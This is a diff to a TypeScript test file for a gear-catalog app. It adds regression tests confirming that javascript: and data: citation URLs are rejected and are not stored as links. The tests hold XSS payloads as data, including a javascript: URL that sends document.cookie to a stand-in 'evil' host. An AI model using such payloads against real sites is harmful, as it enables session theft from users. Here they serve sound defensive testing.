@@ -12,6 +12,7 @@ import {
 } from "../scripts/catalogCsv";
 import {
   CATALOG_DDL,
+  isHttpUrl,
   isTrustedSource,
   proposeCorrection,
   recentChanges,
@@ -180,6 +181,26 @@ describe("isTrustedSource — citation domain allowlist", () => {
     expect(isTrustedSource("https://zpacks.com.evil.example/x")).toBe(false);
     expect(isTrustedSource("https://notzpacks.com/x")).toBe(false);
   });
+  it("rejects a javascript: URL whose authority is a trusted host (XSS/trust bypass)", () => {
+    // new URL("javascript://zpacks.com/...") parses hostname as zpacks.com;
+    // the scheme guard must stop it counting as a trusted citation.
+    expect(isTrustedSource("javascript://zpacks.com/%0aalert(1)")).toBe(false);
+  });
+});
+
+describe("isHttpUrl — only http(s) citations are linkable/storable", () => {
+  it("accepts http and https", () => {
+    expect(isHttpUrl("https://zpacks.com/x")).toBe(true);
+    expect(isHttpUrl("http://example.com")).toBe(true);
+  });
+  it("rejects javascript:/data:/other schemes and junk", () => {
+    expect(isHttpUrl("javascript://zpacks.com/%0aalert(document.cookie)")).toBe(false);
+    expect(isHttpUrl("javascript:alert(1)")).toBe(false);
+    expect(isHttpUrl("data:text/html,<script>alert(1)</script>")).toBe(false);
+    expect(isHttpUrl("not a url")).toBe(false);
+    expect(isHttpUrl("")).toBe(false);
+    expect(isHttpUrl(undefined)).toBe(false);
+  });
 });
 
 describe("proposeCorrection — trust-tiered wiki edits", () => {
@@ -231,6 +252,41 @@ describe("proposeCorrection — trust-tiered wiki edits", () => {
       .where(eq(schema.catalogItems.id, row.id));
     expect(Number(after.weightMg)).toBe(540_000);
     expect(after.sourceUrl).toContain("zpacks.com");
+  });
+
+  it("strips a non-http(s) sourceUrl so it can't be stored or rendered as a link", async () => {
+    const db = await freshCatalogDb();
+    const [row] = await db
+      .insert(schema.catalogItems)
+      .values({ name: "Generic stake", weightMg: 12_000, weightSource: "community", verified: false })
+      .returning();
+    const out = await proposeCorrection(db, {
+      catalogItemId: row.id,
+      newWeightMg: 9_000,
+      sourceUrl: "javascript://x.com/%0afetch('https://evil/?c='+document.cookie)",
+    });
+    expect(out.status).toBe("applied"); // the weight edit still goes through
+    const changes = await recentChanges(db, 10);
+    expect(changes[0].sourceUrl).toBeNull(); // but the malicious citation is dropped
+  });
+
+  it("won't auto-apply a verified-item change cited by a javascript: trusted-host URL", async () => {
+    const db = await freshCatalogDb();
+    const [row] = await db
+      .insert(schema.catalogItems)
+      .values({ name: "Zpacks Duplex", weightMg: 504_622, weightSource: "manufacturer", verified: true })
+      .returning();
+    const out = await proposeCorrection(db, {
+      catalogItemId: row.id,
+      newWeightMg: 540_000,
+      sourceUrl: "javascript://zpacks.com/%0aalert(1)",
+    });
+    expect(out.status).toBe("proposed"); // not trusted → not applied
+    const [after] = await db
+      .select()
+      .from(schema.catalogItems)
+      .where(eq(schema.catalogItems.id, row.id));
+    expect(Number(after.weightMg)).toBe(504_622); // weight untouched
   });
 
   it("rejects bad weights / no-ops / missing items", async () => {
